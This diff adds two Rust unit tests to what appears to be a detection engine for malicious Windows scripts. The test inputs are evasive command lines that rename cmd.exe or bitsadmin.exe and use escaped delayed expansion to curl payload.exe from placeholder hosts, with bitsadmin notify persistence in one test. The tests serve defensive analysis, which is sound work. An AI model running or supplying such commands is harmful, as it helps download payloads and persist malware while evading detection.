@@ -23631,6 +23631,41 @@ C:\Users\Public\ff.tmp /m *.txt /c "cmd /c curl -o out.exe https://copied-forfil
     }
 
     #[test]
+    fn copied_cmd_alias_v_on_child_preserves_escaped_delayed_expansion() {
+        let report = analyze(
+            br#"copy C:\Windows\System32\cmd.exe C:\Users\Public\cm.tmp
+C:\Users\Public\cm.tmp /V:ON /c set U=https://copied-cmd-delayed.example/payload.exe&&curl -o payload.exe ^!U^!
+"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\cm.tmp"#
+                )
+            }),
+            "copied cmd alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-cmd-delayed.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "copied cmd alias child command was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn copied_wmic_alias_process_call_create_child_is_analyzed() {
         let report = analyze(
             br#"copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\wm.tmp
@@ -26252,6 +26287,44 @@ powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmai
                 )
             }),
             "copied bitsadmin URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_bitsadmin_notify_alias_in_deob_text_replays_delayed_child() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\bitsadmin.exe C:\Users\Public\bits.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\bitsadmin.exe"#.to_string(),
+            dst: r#"C:\Users\Public\bits.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\bits.tmp /SetNotifyCmdLine job1 cmd.exe "/V:ON /c set U=https://copied-bits-notify.example/payload.exe&&curl -o payload.exe ^!U^!""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Persistence { command, .. }
+                        if command == r#"cmd.exe /V:ON /c set U=https://copied-bits-notify.example/payload.exe&&curl -o payload.exe ^!U^!"#
+                )
+            }),
+            "copied bitsadmin notify alias did not surface persistence: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-bits-notify.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "copied bitsadmin notify child was not analyzed: {:?}",
             env.traits
         );
     }
